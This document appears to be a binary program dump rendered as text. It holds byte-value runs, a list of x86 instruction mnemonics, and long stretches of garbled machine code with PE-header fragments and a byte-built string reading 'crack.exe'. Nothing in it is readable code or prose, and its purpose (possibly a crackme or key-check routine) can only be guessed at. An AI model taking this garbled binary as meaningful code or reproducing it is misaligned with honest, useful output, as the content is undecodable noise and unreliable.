¡¢£¤¥¦§¨©ª«¬­®¯°±²³´µ¶·¸¹º»¼½¾¿ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÚÛÜÝÞßàáâãäåæçèéêëìíîïðñòóôõö÷øùúûüýþÿ€‚ƒ„…†‡ˆ‰Š‹ŒŽ‘’“”•–—˜™š›œžŸ ¡¢£¤¥¦§¨©ª«¬­®¯°±²³´µ¶·¸¹º»¼½¾¿ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÚÛÜÝÞßàáâãäåæçèéêëìíîïðñòóôõö÷øùúûüýþÿ€‚ƒ„…†‡ˆ‰Š‹ŒŽ‘’“”•–—˜™š›œžŸ ¡¢£¤¥¦§¨©ª«¬­®¯°±²³´µ¶·¸¹º»¼½¾¿ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÚÛÜÝÞßàáâãäåæçèéêëìíîïðñòóôõö÷øùúûüýþÿ€‚ƒ„…†‡ˆ‰Š‹ŒŽ‘’“”•–—˜™š›œžŸ ¡¢£¤¥¦§¨©ª«¬­®¯°±²³´µ¶·¸¹º»¼½¾¿ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÚÛÜÝÞßàáâãäåæçèéêëìíîïðñòóôõö÷øùúûüýþÿ€‚ƒ„…†‡ˆ‰Š‹ŒŽ‘’“”•–—˜™š›œžŸ ¡¢£¤¥¦§¨©ª«¬­®¯°±²³´µ¶·¸¹º»¼½¾¿ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÚÛÜÝÞßàáâãäåæçèéêëìíîïðñòóôõö÷øùúûüýþÿ€‚ƒ„…†‡ˆ‰Š‹ŒŽ‘’“”•–—˜™š›œžŸ ¡¢£¤¥¦§¨©ª«¬­®¯°±²³´µ¶·¸¹º»¼½¾¿ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÚÛÜÝÞßàáâãäåæçèéêëìíîïðñòóôõö÷øùúûüýþÿ€‚ƒ„…†‡ˆ‰Š‹ŒŽ‘’“”•–—˜™š›œžŸ ¡¢£¤¥¦§¨©ª«¬­®¯°±²³´µ¶·¸¹º»¼½¾¿ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÚÛÜÝÞßàáâãäåæçèéêëìíîïðñòóôõö÷øùúûüýþÿ€		‚	ƒ	„	…	†	‡	ˆ	‰	Š	‹	Œ		Ž			‘	’	“	”	•	–	—	˜	™	š	›	œ		ž	Ÿ	 	¡	¢	£	¤	¥	¦	§	¨	©	ª	«	¬	­	®	¯	°	±	²	³	´	µ	¶	·	¸	¹	º	»	¼	½	¾	¿	À	Á	Â	Ã	Ä	Å	Æ	Ç	È	É	Ê	Ë	Ì	Í	Î	Ï	"
+MOV"
+CALL"
+LEA"
+ADD"
+SUB"
+CMP"
+JMP"
+TEST"
+JZ"
+PUSH"
+POP"
+XOR"
+JNZ"
+MOVZX"
+RET"
+JLE"
+LEAVE"
+IMUL"
+SHL"
+AND"
+SHR"
+OR"
+SETLE"
+JC"
+SETNZ"
+NOP"
+JA"
+SAR"
+JNS"
+FLD"
+FSTP"
+MOVSX"
+CMOVZ"
+JG"
+JL"
+SETZ"
+	STOSD.REP"
+JNC"
+JBE"
+JS"
+SBB"
+XCHG"
+ADC"
+CMOVA"
+CMPXCHG.LOCK"
+DIV"
+FNINIT"
+NOT"
+SETG"
+SHLD"
+SHRD*
+€ €*Ã* €	  *U*
+  *1À*   *‰å*  *ƒì*  *	f=  @ MZ*  *
+Çü•@    *  *
+Çø•@    * 	 *
+Çô•@    * 
+*u*  *‹< @ *  *
+º  @ PE  *  *Š  @ * *tW*  *£@ *  *¡–@ *
+  *…À* *t9*  *Ç$   *°§ *è=C  *¨§ *è0C  *  *‹–@ *  *‰* § *èC  *  *‹–@ *  *‰*€ˆ *èn3  *  *ƒ=`@ * *tE**É*
+  *1À**Ã* ¡€  *Ç$   *°§ *èC  *  *ëÅ*°¡€  !*·Q* " #*fú* $*t5* " %*fú* 
+*u—* & '*ƒ¹„   *& 
+*vŽ*  (*‹‘ø   *
+  *1À*
+  *…Ò*	 )*•À* 
+*é|ÿÿÿ*à¡€  **Ç$ E@ *• +*è¤9  *
+  *1À**É**Ã*ð¡€ , '*ƒyt*& 
+*†_ÿÿÿ*  -*‹‰è   *
+  *1À*
+  *…É*	 )*•À* 
+*éMÿÿÿ*¢€	  *U*   *‰å*  .*ƒì(*  /*¡ð•@ * 0 1*ÇD$@ * 2 *£@ *  3*¡ì•@ * 4 5*ÇD$@ *
+ 6 *‰D$* 7 8*ÇD$@ *  9*Ç$@ *§ :*èCB  **É**Ã*Ð¢€  ;*L$*  <*ƒäð*		 =*ÿqü*	  *U*   *‰å*	 >*W*	 ?*V*	 @*S*
+ @ @*1Û*	 *Q*  .*ƒì(* ? A*‹5€¢@ *  B*d¡   *	 > C*‹x* D*ë*€£€ > *9Ç* E*„ˆ  *  F*Ç$è  *€Å‚ ?*ÿÖ*  G*ƒì*  @*‰Ø*, H >*ð±=ä•@ *
+  *…À* I*uÞ*  J*¡è•@ *
+ @ @*1Û*  *ƒø* K*„q  *  J*¡è•@ *
+  *…À* L*„Ñ  * M *
+Ç@    *  J*¡è•@ *  *ƒø* N*„f  *
+ @ @*…Û* O*„„  *  P*¡tr@ *
+  *…À* Q*t* R S*ÇD$    * T *ÇD$   *  S*Ç$    *Ðˆ *ÿÐ*  U*ƒì*ÐŽ V*èG5  *  W*Ç$°J@ *üÄ‚ X*ÿ|¢@ *  G*ƒì* Y *£ –@ *  Z*Ç$ @ *à¦ [*è6A  *€‹ \*èQ3  * ? ]*‹5@ * > ^*<µ   *	  >*‰<$*˜¨ _*èÔA  * @ `*‹@ *  *‰Á*
+ ? ?*…ö* a*Žd  *  b*Wü* ? *‰Æ*	 c *‰Mà*  d**	 e *‰UÜ*	 f *‰Eä* ? g*v *  h*‹* ? G*ƒÆ* @ G*ƒÃ*	  *‰$*à¨ i*èèA  * > j*x*	  >*‰<$*˜¨ _*è•A  *	 k *‰Fü*	  l*‹Kü*
+ 4 >*‰|$*
+ 7 *‰L$*	  *‰$* ¨ m*è‡A  * f @*9]ä* n*uÊ*	  c*‹Mà*	  e*‹UÜ*
+  *Ê* o S*Ç    * ` *‰@ *à‡ p*è)1  *  q*¡@ *  r*‹˜¢@ * o *‰*
+ 4 *‰D$*  s*¡@ *
+ 7 *‰D$*  t*¡@ *	  *‰$*€° u*è"E  *  v*‹@ * w *£@ *
+  *…É* x*„Î   *  M*‹@ *
+  *…Ò* y*tu*  z*eð*
+ *Y*
+ @*[*
+ ?*^*
+ >*_*
+  *]*  {*aü**Ã*¦€  J*¡è•@ * @ *»   *  *ƒø* |*…þÿÿ*  }*Ç$   *À§ ~*è‘@  *  J*¡è•@ *  *ƒø* *…šþÿÿ* T €*ÇD$°@ *  *Ç$ °@ *Ð§ ‚*è@  * ƒ *
+Çè•@    *
+ @ @*…Û* „*…|þÿÿ*) H @*‡ä•@ * „*éqþÿÿ*ð¦€È§ …*èS@  *  w*¡@ *  z*eð*
+ *Y*
+ @*[*
+ ?*^*
+ >*_*
+  *]*  {*aü**Ã*§€ ƒ *
+Çè•@    * T †*ÇD$°@ *  ‡*Ç$°@ *Ð§ ‚*è"@  * ˆ*éþÿÿ*¸§€  *‰Â* ‰*éçþÿÿ*¿§€  *‰$*ø§ Š*è1@  *à§€ ‹ S*
+Ç–@     *Ð¢€ Œ*éaýÿÿ*ð§€	  *U*   *‰å*  *ƒì*
+  *‹E*	  *‰$*à§ Ž*èß?  **É*  *ƒø*
+(  *À**Ã*¨€	  *U*   *‰å*	 >*W*	 ?*V*	 @*S*  *ƒì*  *Ç$ p@ *ÐÄ‚ ‘*ÿP¢@ *  G*ƒì*
+  *…À*	 ’*ts* @ *‰Ã*  *Ç$ p@ *øÄ‚ “*ÿx¢@ * > ”*‹=\¢@ *  G*ƒì* • *£ @ * 7 –*ÇD$p@ *	  @*‰$*ÜÄ‚ >*ÿ×*  —*ƒì* ? *‰Æ* 7 ˜*ÇD$)p@ *	  @*‰$*ÜÄ‚ >*ÿ×*  —*ƒì* ™ *£ `@ *
+ ? ?*…ö*	 š*t* 7 ›*ÇD$$@ *  œ*Ç$@ * ?*ÿÖ*  *Ç$°@ *ð§€ ž*è^ÿÿÿ*  Ÿ*eô*
+ @*[*
+ ?*^*
+ >*_*
+  *]**Ã* ©€   *¸ØR@ * ? ¡*¾ÐR@ *	 ¢*ëÀ*°©€	  *U*   *‰å*  *ƒì*  ™*¡ `@ *
+  *…À*	 £*t	*  œ*Ç$@ * *ÿÐ*  •*¡ @ *
+  *…À*	 ¤*t*	  *‰$*´Ä‚ ¥*ÿ4¢@ *  G*ƒì**É**Ã*à©€	  *U*   *‰å*	 @*S*  ¦*ìt  * § G*ÇD$   *  —*Ç$   *ì¯ ¨*èîB  *  *‰Â*  ©*…ìþÿÿ* § *‰T$*
+  *‹U*	  *‰$*  *‰Á*Œ† ª*èõ-  *  —*ƒì*  ©*…ìþÿÿ* « *ÇD$   *  S*Ç$    * § S*ÇD$    *  *‰Á*¬† ¬*èî-  *  U*ƒì*  ­*…Øþÿÿ*  ©*•ìþÿÿ*	  *‰$*  *‰Á*¤† ®*èÍ-  *  G*ƒì*  ­*…Øþÿÿ*  *‰Á*Ø¯ ¯*èqB  *
+ ° *‰Eð*  ©*…ìþÿÿ* § S*ÇD$    *  S*Ç$    * ± S*ÇD$    *  *‰Á*¬† ¬*èž-  *  U*ƒì*
+  °*‹Eð*	  *‰$*˜¨ _*è|>  * ² *£@@ *  ³*‹@@ *  ©*…ìþÿÿ*
+  °*‹Mð* ± *‰L$*	  *‰$*  *‰Á*´† ´*èv-  *  —*ƒì*  ©*…ìþÿÿ*  *‰Á*”† µ*èF-  * ¶ ·*
+Ç…Ôþÿÿ   *  ¶*‹…Ôþÿÿ*  j*P*  ¶*‹…Ôþÿÿ*  *¯Â*  *ƒà*
+  *…À*	 )*•À*
+ ) )*„À* ¸*„  *  ¹*… üÿÿ*	  *‰$*  º*¡h¢@ *èÄ‚ *ÿÐ*  G*ƒì*  »*‹…üÿÿ* ¼ *‰…Ðþÿÿ*  ½*‹…üÿÿ* ¾ *‰…Ìþÿÿ*  ¿*…¼þÿÿ*	  *‰$*  À*¡D¢@ *ÄÄ‚ *ÿÐ*  G*ƒì*  Á*·…¼þÿÿ* Â Ã*f‰…ºþÿÿ*  Ä*·…¾þÿÿ* Å Ã*f‰…¸þÿÿ*  Æ*·…Âþÿÿ* Ç Ã*f‰…¶þÿÿ* È É*
+Ç…°þÿÿ   *  Ê*…°þÿÿ* ± *‰D$*  Ë*…@üÿÿ*	  *‰$*  Ì*¡ ¢@ *€Ä‚ *ÿÐ*  —*ƒì* Í *‰…¬þÿÿ* Î É*
+Ç…¨þÿÿ   *  Ï*…¨þÿÿ* ± *‰D$*  Ð*…@ýÿÿ*	  *‰$*  Ñ*¡8¢@ *¸Ä‚ *ÿÐ*  —*ƒì* Ò *‰…¤þÿÿ*  ¼*‹•Ðþÿÿ*  ¾*‹…Ìþÿÿ*
+  *1Ð* Ó *‰… þÿÿ*  Â*·…ºþÿÿ*  Ã*·À*  Ô*Áà*  *‰Â*  Å*·…¸þÿÿ*  Ã*·À*  —*Áà*
+  *	Â*  Ç*·…¶þÿÿ*  Ã*·À*
+  *	Â*  Ó*‹… þÿÿ*
+  *1Ð* Ó *‰… þÿÿ*  Í*‹…¬þÿÿ*
+  *…À*	 Õ*t*  Ò*‹…¤þÿÿ*
+  *…À*	 Õ*t*  *¸   *	 Ö*ë*£®€  S*¸    *
+ ) )*„À*	 ×*t*  Ó*‹… þÿÿ*  Ø*5ï¾­Þ* Ó *‰… þÿÿ* Ù S*
+Ç…œþÿÿ    *	 Ú*ëE*É®€  Ó*‹• þÿÿ*  *‰Ð*  Û*Áà*
+  *)Ð*  *‰Á*  Ù*‹…œþÿÿ*
+  *È* Ó *‰… þÿÿ*  Ó*‹… þÿÿ*  Ô*Áè*  *‰Â*  Ó*‹… þÿÿ*
+  *1Ð* Ó *‰… þÿÿ*  Ù*‹…œþÿÿ*  *ƒÀ* Ù *‰…œþÿÿ*  Ù*‹…œþÿÿ*  *ƒø*	 )*žÀ*
+ ) )*„À*	 Ü*u«* Ý S*
+Ç…˜þÿÿ    *	 Þ*ë3*ª¯€  Ó*‹• þÿÿ*  Ý*‹…˜þÿÿ*  *Áà*  *‰Á*  ß*Óê*  *‰Ð*  *‰Â*  Ý*‹…˜þÿÿ* à á*ˆ”Àûÿÿ*  Ý*‹…˜þÿÿ*  *ƒÀ* Ý *‰…˜þÿÿ*  Ý*‹…˜þÿÿ*  ·*ƒø*	 )*žÀ*
+ ) )*„À*	 â*u½* ± ã*ÇD$@   *  ä*…Àûÿÿ*	  *‰$*« å*è=  *  —*ƒì* æ S*ÇEô    * ç*é  *’°€  è*¡l¢@ *ìÄ‚ *ÿÐ* é *‰…”þÿÿ*  é*‹…”þÿÿ*  ê*=¥¥¥¥*	 ë*u*  é*‹…”þÿÿ*
+  *…À*	 ë*y*  *¸   *	 ì*ë*½°€  S*¸    *
+ ) )*„À* í*„s  * î S*
+Ç…Œþÿÿ    *	 ï*ëO*Ö°€  î*‹…Œþÿÿ*  *‰Â*  *‰Ð*  ð*Áà*
+  *)Ð*  ñ*ƒÀ*  ò*ƒà* @ *‰Ã*  î*‹Œþÿÿ*  ó*º…ëQ*  *‰È* *÷ê*  *‰Ð*  Û*Áø*  *‰Ê*  }*Áú*
+  *)Ð*   ô*kÐd*  *‰È*
+  *)Ð* õ ö*ˆœ@üÿÿ*  î*‹…Œþÿÿ*  *ƒÀ* î *‰…Œþÿÿ*  î*‹…Œþÿÿ*  ÷*ƒøc*	 )*žÀ*
+ ) )*„À*	 ø*u¡* ù S*Æ…£üÿÿ *  Ë*…@üÿÿ*	  *‰$*à¨ i*è–;  *
+ ú *‰Eì*
+  ú*‹Eì*  ã*º@   *
+  *9Ð*+  *GÂ* û *‰…þÿÿ*  ü*Ç$€   *˜¨ _*è,;  *
+ ý *‰Eè* ý S*ƒ}è * þ*„‹  *  û*‹…þÿÿ* § *‰D$*  Ë*…@üÿÿ* ± *‰D$*
+  ý*‹Eè*	  *‰$* ¨ m*è;  *
+  ý*‹Uè*  û*‹…þÿÿ*
+  *Ð*
+ ÿ S*Æ  * € S*
+Ç…ˆþÿÿ    *  S*
+Ç…|þÿÿ    * ‚*éŠ   *¿²€ ƒ S*
+Ç…xþÿÿ    *	 „*ë_*Ë²€  ý*‹Mè*  *‹•|þÿÿ*  ƒ*‹…xþÿÿ*
+  *Â*  *‰Ð*  }*Áø*  …*Áè*
+  *Â*  †*ƒâ?*
+  *)Â*  *‰Ð*
+  *È*  ÿ*¶ *  )*¾Ð*  €*‹…ˆþÿÿ*
+  *1Ð* € *‰…ˆþÿÿ*  €*‹•ˆþÿÿ*  *‰Ð*  Û*Áà*
+  *)Ð*  ‡*-G†Èa* € *‰…ˆþÿÿ*  ƒ*‹…xþÿÿ*  *ƒÀ* ƒ *‰…xþÿÿ*  ƒ*‹…xþÿÿ*  G*ƒø*	 )*žÀ*
+ ) )*„À*	 ˆ*u‘*  *‹…|þÿÿ*  *ƒÀ*  *‰…|þÿÿ*  *‹…|þÿÿ*  ‰*ƒø	*	 )*žÀ*
+ ) )*„À* Š*…bÿÿÿ*  €*‹…ˆþÿÿ* « *‰D$* § ‹*ÇD$Dp@ * ± ü*ÇD$€   *  Ð*…@ýÿÿ*	  *‰$*  Œ*¡ `@ * ¦ *ÿÐ*  Ð*…@ýÿÿ*	  *‰$*à¨ i*èK:  *  *‰…„þÿÿ* Ž S*Æ…ƒþÿÿ *  S*
+Ç…tþÿÿ    *	 *ë;*®´€  *‹…tþÿÿ*  *‹„þÿÿ*  S*º    *- *÷ñ*  *‰Ð*  ‘*¶”@ýÿÿ*  Ž*¶…ƒþÿÿ*
+  *1Ð* Ž )*ˆ…ƒþÿÿ*  *‹…tþÿÿ*  *ƒÀ*  *‰…tþÿÿ*  *‹…tþÿÿ*  G*ƒø*	 )*žÀ*
+ ) )*„À*	 ’*uµ*
+  ý*‹Eè*	  *‰$*ˆ¨ “*è„9  * § Ô*ÇD$   *  Ð*…@ýÿÿ* ± *‰D$*  ¹*… üÿÿ*	  *‰$* ¨ m*è|9  * 7 ã*ÇD$@   *  ¹*… üÿÿ*	  *‰$*« å*èÖ:  *  —*ƒì*  ³*‹@@ *
+  æ*‹Eô*
+  *Ð*  ÿ*¶ * ) ”*<**	 •*uF*  ²*¡@@ *
+  æ*‹Uô*  *ƒÂ*
+  *Ð*  ÿ*¶ * ) –*<B*	 •*u2*  ²*¡@@ *
+  æ*‹Uô*  *ƒÂ*
+  *Ð*  ÿ*¶ * ) ”*<**	 •*u* — ˜*Æ •@ Y* ™ š*Æ¡•@ E* › œ*Æ¢•@ S*  S*Æ£•@  *	 ž*ë*•¶€ æ *ƒEô*
+  æ*‹Eô*  °*;Eð*" Ÿ*Œíüÿÿ* ±  *ÇD$Np@ *  ¡*Ç$ •@ *Ð¨ ¢*è9  *
+  *…À* £*„•   * ± G*ÇD$   *  Ô*Ç$   *ì¯ ¨*è—<  *  *‰Â*  Ð*…@ýÿÿ* ± *‰T$*
+  *‹U*	  *‰$*  *‰Á*ô… ¤*è†'  *  —*ƒì*
+  ¥*‹E* ± *‰D$*  Ð*…@ýÿÿ*	  *‰$*ä… ¦*è^'  * « §*ÇD$d @*  Ð*…@ýÿÿ*	  *‰$*ä… ¦*èH'  *  ³*‹@@ *  Ð*…@ýÿÿ*
+  °*‹Mð* ¨ *‰L$*	  *‰$*  *‰Á*œ† ©*èc'  *  —*ƒì*  Ð*…@ýÿÿ*  *‰Á*ü… µ*è3'  *  Ð*…@ýÿÿ*  *‰Á*ì… ª*è'  *  «*¡<¢@ *¼Ä‚ *ÿÐ*	  *‰$*  ¬*¡X¢@ *ØÄ‚ *ÿÐ*  G*ƒì*  ­*ƒøÿ*	# )*”À*
+ ) )*„À* ®*„Ù  * ¯ S*
+Ç…`þÿÿ    *	 °*ë>*„¸€  ¯*‹…`þÿÿ*   ±*iÀ¹y7ž*  ¯*‹•`þÿÿ*  Ô*Áâ*
+  *1Â*  ¯*‹…`þÿÿ*  —*Áø*
+  *1Â*  ¯*‹…`þÿÿ* ² *‰”…@ýÿÿ*  ¯*‹…`þÿÿ*  *ƒÀ* ¯ *‰…`þÿÿ*  ¯*‹…`þÿÿ*  }*ƒø*	 )*žÀ*
+ ) )*„À*	 ³*u²* ´ µ*
+Ç…pþÿÿÅ* ¶ S*
+Ç…\þÿÿ    *	 ·*ë<*è¸€  ¶*‹…\þÿÿ*  ²*‹”…@ýÿÿ*  ´*‹…pþÿÿ*
+  *1Ð* ´ *‰…pþÿÿ*  ´*‹…pþÿÿ*   ¸*iÀ“ * ´ *‰…pþÿÿ*  ¶*‹…\þÿÿ*  *ƒÀ* ¶ *‰…\þÿÿ*  ¶*‹…\þÿÿ*  }*ƒø*	 )*žÀ*
+ ) )*„À*	 ¹*u´* º S*
+Ç…Xþÿÿ    * »*é¶   *Ã¹€  ´*‹•pþÿÿ*  º*‹…Xþÿÿ*  *Áà*  *‰Á*  ß*Óê*  *‰Ð*  ¼*ƒà* ½ *‰…Tþÿÿ* ¾ S*
+Ç…Pþÿÿ    *	 ¿*ëL*í¹€  ½*‹…Tþÿÿ*  À*Å    *  ½*‹…Tþÿÿ*  *Áè*
+  *Â*  ½*‹…Tþÿÿ*
+  *1Ð* ½ *‰…Tþÿÿ*  ½*‹…Tþÿÿ*   ±*iÀ¹y7ž*  Ø*5ï¾­Þ* ½ *‰…Tþÿÿ*  ¾*‹…Pþÿÿ*  *ƒÀ* ¾ *‰…Pþÿÿ*  ¾*‹…Pþÿÿ*  *ƒø*	 )*žÀ*
+ ) )*„À*	 Á*u¤*  ½*‹•Tþÿÿ*  º*‹…Xþÿÿ*  *Áà*  *‰Á*  ß*Óâ*  ´*‹…pþÿÿ*
+  *1Ð* ´ *‰…pþÿÿ*  º*‹…Xþÿÿ*  *ƒÀ* º *‰…Xþÿÿ*  º*‹…Xþÿÿ*  ·*ƒø*	 )*žÀ*
+ ) )*„À* Â*…6ÿÿÿ* Ã S*
+Ç…Lþÿÿ    * Ä*é   *œ»€ @ ´*‹pþÿÿ*  Ã*‹•Lþÿÿ*  *‰Ð*  }*Áø*  Å*Áè*
+  *Â*  ð*ƒâ*
+  *)Â*  *‰Ð*  ð*Áà*  *‰Á* @ ß*Óë*  @*‰Ø*  *‰Á*  Ã*‹…Lþÿÿ*  Æ*ºZ   *  *¯Â*
+  *1Á*  *‰Ê*  Ã*‹…Lþÿÿ* õ á*ˆ”@üÿÿ*  Ã*‹…Lþÿÿ*
+  *…À*	0 )*ŸÀ*
+ ) )*„À*	 Ç*t(*  Ã*‹…Lþÿÿ*  *ƒè*  õ*¶Œ@üÿÿ*  Ã*‹…Lþÿÿ*  õ*¶”@üÿÿ*
+  *1Ê* õ á*ˆ”@üÿÿ*  Ã*‹…Lþÿÿ*  *ƒÀ* Ã *‰…Lþÿÿ*  Ã*‹…Lþÿÿ*  †*ƒø?*	 )*žÀ*
+ ) )*„À* È*…_ÿÿÿ* É S*
+Ç…hþÿÿ    * Ê S*
+Ç…lþÿÿ    * Ë S*
+Ç…Hþÿÿ    * Ì*é   *à¼€  Ë*‹…Hþÿÿ*  õ*¶„@üÿÿ*  )*¶À*  *‰Á* @ S*»    *  É*‹…hþÿÿ*  Ê*‹•lþÿÿ*
+  *È*
+*  @*Ú* É *‰…hþÿÿ* Ê *‰•lþÿÿ*  É*‹…hþÿÿ*  Ê*‹•lþÿÿ*1   ñ*¤Â*  ñ*Áà*  *‰Á* @ *‰Ó*  É*‹…hþÿÿ*  Ê*‹•lþÿÿ*2   Í*¬Ð*  Í*Áê*
+  *	Á*
+ @ *	Ó*  É*‹…hþÿÿ*  Ê*‹•lþÿÿ*
+  *1È*
+  @*1Ú* É *‰…hþÿÿ* Ê *‰•lþÿÿ*  Ë*‹…Hþÿÿ*  *ƒÀ* Ë *‰…Hþÿÿ*  Ë*‹…Hþÿÿ*  †*ƒø?*	 )*žÀ*
+ ) )*„À* Î*…_ÿÿÿ* Ï S*
+Ç…dþÿÿ    * Ð S*
+Ç…Dþÿÿ    *	 Ñ*ëC*—¾€  É*‹…hþÿÿ*  Ê*‹•lþÿÿ*  *‰Â*  Ï*‹…dþÿÿ*
+  *1Ð* Ï *‰…dþÿÿ*  Ï*‹•dþÿÿ*  *‰Ð*  Û*Áà*
+  *)Ð*  Ò*xV4* Ï *‰…dþÿÿ*  Ð*‹…Dþÿÿ*  *ƒÀ* Ð *‰…Dþÿÿ*  Ð*‹…Dþÿÿ*  *ƒø*	 )*žÀ*
+ ) )*„À*	 Ó*u­* Ô S*
+Ç…@þÿÿ    *	 Õ*ë2*ö¾€  Ï*‹•dþÿÿ*  Ô*‹…@þÿÿ*
+  *À*  *‰Á*  ß*Óú*  *‰Ð*  *‰Â*  Ô*‹…@þÿÿ* Ö á*ˆ” ûÿÿ*  Ô*‹…@þÿÿ*  *ƒÀ* Ô *‰…@þÿÿ*  Ô*‹…@þÿÿ*  ¼*ƒø*	 )*žÀ*
+ ) )*„À*	 ×*u¾* ¨ Ø*ÇD$    *  Ù*… ûÿÿ*	  *‰$*« å*èÂ5  *  —*ƒì*  ²*¡@@ *	  *‰$*ˆ¨ “*è*4  *  ©*…ìþÿÿ*  *‰Á*„† Ú*è#  *	 Û*ë**—À€ @ Ü*‹]ü**É**Ã*œÀ€	  *U*   *‰å*	 >*W*	 @*S*  Ý*ì  * Þ S*
+Ç…Úûÿÿ    * ß S*
+Ç…Þûÿÿ    * à S*
+Ç…âûÿÿ    * á S*
+Ç…æûÿÿ    * â S*
+Ç…êûÿÿ    * ã S*
+Ç…îûÿÿ    * ä S*
+Ç…òûÿÿ    * å S*
+Ç…öûÿÿ    * æ S*
+Ç…úûÿÿ    * ç S*
+Ç…þûÿÿ    * è S*	fÇ…üÿÿ  * é S*
+Ç…Êûÿÿ    * ê S*
+Ç…Îûÿÿ    * ë S*
+Ç…Òûÿÿ    * ì S*
+Ç…Öûÿÿ    *  í*…*ûÿÿ*  î*¹    * @ S*»    *  @*‰* ï @*‰\ü*  ð*P*  ñ*ƒâü*
+  *)Ð*
+  *Á*  ñ*ƒáü*  *Áé* > *‰×*  @*‰Ø*	$ ò*ó«* ó S*
+Ç…ûÿÿ    * ô S*
+Ç…ûÿÿ    * õ S*
+Ç…"ûÿÿ    * ö S*
+Ç…&ûÿÿ    * ÷ S*
+Ç…
+ûÿÿ    * ø S*
+Ç…ûÿÿ    * ù S*
+Ç…ûÿÿ    * ú S*
+Ç…ûÿÿ    * û ü*ÇEÔÿÿÿÿ* ý ü*ÇEÐÿÿÿÿ* þ ü*ÇEÌÿÿÿÿ* æ S*ÇEô    * ÿ S*ÇEÈ    * € ·*
+Ç…ûÿÿ   *  €*‹…ûÿÿ*  j*P*  €*‹…ûÿÿ*  *¯Â*  *ƒà*
+  *…À*	 )*•À*
+ ) )*„À* *„‚  *  ‚*•œùÿÿ*  S*¸    *  Ø*¹    * > *‰×*	$ ò*ó«* ƒ S*
+Ç…ùÿÿ    * „ S*
+Ç… ùÿÿ    * … S*
+Ç…$ùÿÿ    * † S*
+Ç…(ùÿÿ    * ‡ S*
+Ç…,ùÿÿ    * ˆ S*
+Ç…0ùÿÿ    * ‰ S*
+Ç…4ùÿÿ    * Š S*
+Ç…8ùÿÿ    * ‹ S*
+Ç…<ùÿÿ    * Œ S*
+Ç…@ùÿÿ    *  S*
+Ç…Dùÿÿ    * Ž S*
+Ç…Hùÿÿ    *  S*
+Ç…Lùÿÿ    *  S*
+Ç…Pùÿÿ    * ‘ S*
+Ç…Tùÿÿ    * ’ S*
+Ç…Xùÿÿ    *  è*¡l¢@ *ìÄ‚ *ÿÐ* “ *‰…ðúÿÿ*  ”*…Üøÿÿ*	  *‰$*  º*¡h¢@ *èÄ‚ *ÿÐ*  G*ƒì*  •*…ôúÿÿ*	  *‰$*  À*¡D¢@ *ÄÄ‚ *ÿÐ*  G*ƒì*  –*‹…ðøÿÿ* — *‰…ìúÿÿ*  ˜*‹…àøÿÿ* ™ *‰…èúÿÿ*  —*‹•ìúÿÿ*  ™*‹…èúÿÿ*
+  *1Ð* š *‰…äúÿÿ* › S*
+Ç…øÿÿ    * œ S*
+Ç…øÿÿ    *  S*
+Ç…øÿÿ    * ž S*
+Ç…øÿÿ    * Ÿ S*
+Ç…øÿÿ    *   S*
+Ç… øÿÿ    * ¡ S*
+Ç…$øÿÿ    * ¢ S*
+Ç…(øÿÿ    * ° S*ÇEð    *	 £*ëH*óÅ€  °*‹Eð*  ¤*º7   *  *¯Â*  ¥*P*  ¦*øÿÿ*
+  °*‹Eð*
+  *È*
+ ÿ á*ˆ*  ¦*•øÿÿ*
+  °*‹Eð*
+  *Ð*  ÿ*¶ *  )*¶Ð*
+  °*‹Eð*  }*ƒà*  *‰Á*  ß*Óâ*  š*‹…äúÿÿ*
+  *1Ð* š *‰…äúÿÿ* ° *ƒEð* ° ·*ƒ}ð*	 §*~²*  ™*‹•èúÿÿ*  —*‹…ìúÿÿ* ¨ *‰T$* © *‰D$* ª ‹*ÇD$Xp@ * « ü*ÇD$€   *  ‚*…œùÿÿ*	  *‰$*  Œ*¡ `@ * ¦ *ÿÐ*  ¬*·… ûÿÿ*  Ã*·È*  ­*·…þúÿÿ*  Ã*·Ð*  ®*·…üúÿÿ*  Ã*·À* ¯ *‰L$*
+ 0 *‰T$*
+ 6 *‰D$* 4 °*ÇD$jp@ * 7 ã*ÇD$@   *  ±*…ùÿÿ*	  *‰$*  Œ*¡ `@ * ¦ *ÿÐ*  ‚*…œùÿÿ*	  *‰$*à¨ i*è“0  * ² *‰…àúÿÿ*  ±*…ùÿÿ*	  *‰$*à¨ i*è0  * ³ *‰…Üúÿÿ*  ²*‹•àúÿÿ*  ³*‹…Üúÿÿ*
+  *1Â*  “*‹…ðúÿÿ*
+  *1Ð* ´ *‰…Øúÿÿ* µ S*
+Ç…œøÿÿ    * ¶ S*
+Ç… øÿÿ    * · S*
+Ç…¤øÿÿ    * ¸ S*
+Ç…¨øÿÿ    * ¹ S*
+Ç…¬øÿÿ    * º S*
+Ç…°øÿÿ    * » S*
+Ç…´øÿÿ    * ¼ S*
+Ç…¸øÿÿ    * ½ S*
+Ç…¼øÿÿ    * ¾ S*
+Ç…Àøÿÿ    * ¿ S*
+Ç…Äøÿÿ    * À S*
+Ç…Èøÿÿ    * Á S*
+Ç…Ìøÿÿ    * Â S*
+Ç…Ðøÿÿ    * Ã S*
+Ç…Ôøÿÿ    * Ä S*
+Ç…Øøÿÿ    *  ²*‹…àúÿÿ*  Å*ƒø>*	 Æ*w*  ²*‹…àúÿÿ*	 Ç*ë*¶É€  †*¸?   *
+ 4 *‰D$*  ‚*…œùÿÿ*
+ 7 *‰D$*  È*…œøÿÿ*	  *‰$* ¨ m*èI/  * 7 Ø*ÇD$    *  ¦*…øÿÿ*	  *‰$*« å*è£0  *  —*ƒì* 7 ã*ÇD$@   *  È*…œøÿÿ*	  *‰$*« å*èŠ0  *  —*ƒì*  É*…Úûÿÿ*  Ê*Ç crac* Ë Ì*Ç@k.ex* Í Î*fÇ@e *  Ï*Ç$ˆ  *  Ð*¡€¢@ *€Å‚ *ÿÐ*  G*ƒì*  Ñ*…„þÿÿ*
